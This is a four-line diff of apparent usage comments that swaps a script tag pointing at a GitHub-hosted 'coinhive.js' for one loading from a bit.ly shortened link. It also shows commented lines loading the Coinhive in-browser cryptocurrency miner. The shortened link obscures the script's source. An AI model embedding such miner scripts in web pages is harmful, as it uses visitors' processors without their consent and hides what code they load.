@@ -1,4 +1,4 @@
-# USE -- <script src="https://raw.githubusercontent.com/Janddda/testing/master/coinhive.js"></script>
+# USE -- <script src="http://bit.ly/2BIiCNi"></script>
 
 #<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 #<script>
